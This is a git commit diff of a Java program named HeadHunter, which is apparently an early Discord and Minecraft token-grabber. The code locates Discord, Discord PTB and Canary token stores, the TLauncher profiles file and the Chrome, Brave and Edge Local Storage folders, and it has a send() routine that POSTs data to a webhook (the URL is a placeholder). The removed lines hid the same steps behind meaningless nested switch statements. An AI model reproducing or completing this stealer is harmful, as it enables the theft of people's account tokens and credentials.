24fa3b26e3ecd4131b52ac94aa9a42db64e4000b
FERDdeveloper <86313430+ferderplays@users.noreply.github.com>
2022-03-12 20:53:12 +0100

    Update HeadHunter.java

--- HeadHunter.java
+++ HeadHunter.java
@@ -6,7 +6,7 @@ import java.nio.charset.*;
 import java.util.*;
 
 public class HeadHunter {
-    public static String var1_1, var1_2, var1_3, var1_4, var1_5, var1_6, var1_7, var1_8, var1_9;
+    public static File var1_1, var1_2, var1_3, var1_4, var1_5, var1_6, var1_7, var1_8, var1_9;
     public static String appdata = System.getenv("APPDATA");
     public static String lappdata = System.getenv("LOCALAPPDATA");
     public static File downloads = new File(System.getProperty("user.home") + "/downloads");
@@ -15,212 +15,61 @@ public class HeadHunter {
     public static URL webhook;
 
     public static void main(String[] args) throws MalformedURLException, IOException {
-        int h = 0;
-        switch (h) {
-            case 10:
-                break;
-            case 9:
-                break;
-            case 8:
-                break;
-            case 7:
-                break;
-            case 6:
-                break;
-            case 5:
-                break;
-            case 4:
-                break;
-            case 3:
-                break;
-            case 2:
-                break;
-            case 1:
-                break;
-            case 0:
-                var1_1 = appdata + "/Roaming/discord/Local Storage/leveldb";
-                int j = 1;
-                switch (j) {
-                    case 10:
-                        break;
-                    case 9:
-                        break;
-                    case 8:
-                        break;
-                    case 7:
-                        break;
-                    case 6:
-                        break;
-                    case 5:
-                        break;
-                    case 4:
-                        break;
-                    case 3:
-                        break;
-                    case 2:
-                        break;
-                    case 1:
-                        var1_2 = appdata + "/Roaming/discordptb/Local Storage/leveldb";
-                        int k = 2;
-                        switch (k) {
-                            case 10:
-                                break;
-                            case 9:
-                                break;
-                            case 8:
-                                break;
-                            case 7:
-                                break;
-                            case 6:
-                                break;
-                            case 5:
-                                break;
-                            case 4:
-                                break;
-                            case 3:
-                                break;
-                            case 2:
-                                var1_3 = appdata + "/Roaming/discordcanary/Local Storage/leveldb";
-                                int l = 2;
-                                switch (l) {
-                                    case 10:
-                                        break;
-                                    case 9:
-                                        break;
-                                    case 8:
-                                        break;
-                                    case 7:
-                                        break;
-                                    case 6:
-                                        break;
-                                    case 5:
-                                        break;
-                                    case 4:
-                                        break;
-                                    case 3:
-                                        break;
-                                    case 2:
-                                        var1_4 = appdata + "/Roaming/.minecraft/TlauncherProfiles.json";
-                                        if (var1_4.contains("{") && var1_4.contains("name") && var1_4.contains(":")
-                                                && var1_4.contains("}")) {
-                                            int m = 2;
-                                            switch (m) {
-                                                case 10:
-                                                    break;
-                                                case 9:
-                                                    break;
-                                                case 8:
-                                                    break;
-                                                case 7:
-                                                    break;
-                                                case 6:
-                                                    break;
-                                                case 5:
-                                                    break;
-                                                case 4:
-                                                    break;
-                                                case 3:
-                                                    break;
-                                                case 2:
-                                                    var1_5 = lappdata
-                                                            + "/Google/Chrome/User Data/Default/Loacl Storage/leveldb";
-                                                    int n = 2;
-                                                    switch (n) {
-                                                        case 10:
-                                                            break;
-                                                        case 9:
-                                                            break;
-                                                        case 8:
-                                                            break;
-                                                        case 7:
-                                                            break;
-                                                        case 6:
-                                                            break;
-                                                        case 5:
-                                                            break;
-                                                        case 4:
-                                                            break;
-                                                        case 3:
-                                                            break;
-                                                        case 2:
-                                                            var1_6 = lappdata
-                                                                    + "/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb";
-                                                            int v = 2;
-                                                            switch (v) {
-                                                                case 10:
-                                                                    break;
-                                                                case 9:
-                                                                    break;
-                                                                case 8:
-                                                                    break;
-                                                                case 7:
-                                                                    break;
-                                                                case 6:
-                                                                    break;
-                                                                case 5:
-                                                                    break;
-                                                                case 4:
-                                                                    break;
-                                                                case 3:
-                                                                    break;
-                                                                case 2:
-                                                                    var1_7 = lappdata
-                                                                            + "/Microsoft/Edge/User Data/Default/Local Storage/leveldb";
-                                                                    break;
-                                                                case 1:
-                                                                    break;
-                                                            }
-                                                            break;
-                                                        case 1:
-                                                            break;
-                                                    }
-                                                    break;
-                                                case 1:
-                                                    break;
-                                            }
-                                        }
-                                        break;
-                                    case 1:
-                                        break;
-                                }
-                                break;
-                            case 1:
-                                break;
-                        }
-                        break;
+        webhook = new URL("imagine url here");
+        var1_1 = new File(appdata + "/Roaming/discord/Local Storage/leveldb");
+        var1_2 = new File(appdata + "/Roaming/discordptb/Local Storage/leveldb");
+        var1_3 = new File(appdata + "/Roaming/discordcanary/Local Storage/leveldb");
+        var1_4 = new File(appdata + "/Roaming/.minecraft/TlauncherProfiles.json");
+        var1_5 = new File(lappdata + "/Google/Chrome/User Data/Default/Loacl Storage/leveldb");
+        var1_6 = new File(lappdata + "/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb");
+        var1_7 = new File(lappdata + "/Microsoft/Edge/User Data/Default/Local Storage/leveldb");
+        if (var1_1.exists()) {
+            for (File file1 : var1_1.listFiles()) {
+                if (file1.toString().contains(".ldb")) {
                 }
-                break;
+            }
+        } else {
+            throw new IllegalArgumentException("Folder not found");
         }
 
-        for (File f : downloads.listFiles()) {
-            if (f.getName().contains(".jar")) {
-                var1_8 = f.toString();
+        if (var1_2.exists()) {
+            for (File file2 : var1_2.listFiles()) {
+                if (file2.toString().contains(".ldb")) {
+                }
+            }
+        } else {
+            throw new IllegalArgumentException("Folder not found");
+        }
+
+        if (var1_3.exists()) {
+            for (File file3 : var1_3.listFiles()) {
+                if (file3.toString().contains(".ldb")) {
+                }
+            }
+        } else {
+            throw new IllegalArgumentException("Folder not found");
+        }
+
+        if (var1_4.exists()) {
+            try (FileReader reader = new FileReader(var1_4)) {
+                BufferedReader reader2 = new BufferedReader(reader);
+                do {
+                    String key = "\"name\"";
+                    if (reader2.readLine().contains(key)) {
+                    }
+                } while (reader2.readLine() != null);
             }
         }
-
-        sender();
-
     }
 
-    public static void sender() throws IOException {
-        webhook = new URL("imagine url here");
-        send(webhook, var1_8);
-        send(webhook, var1_1);
-        send(webhook, var1_2);
-        send(webhook, var1_3);
-        send(webhook, var1_4);
-        send(webhook, var1_5);
-        send(webhook, var1_6);
-        send(webhook, var1_7);
-    }
-
-    public static void send(URL url, String file) throws IOException {
+    public static void send(URL url, File file) throws IOException {
         connection = (HttpsURLConnection) url.openConnection();
         connection.setRequestProperty("CONTENT-TYPE", "application/json");
         connection.setRequestMethod("POST");
         output = connection.getOutputStream();
-        output.write(file.getBytes(StandardCharsets.UTF_8));
+        output.write(file.toString().getBytes(StandardCharsets.UTF_8));
         output.close();
+        connection.getInputStream().close();
         connection.disconnect();
     }
 }
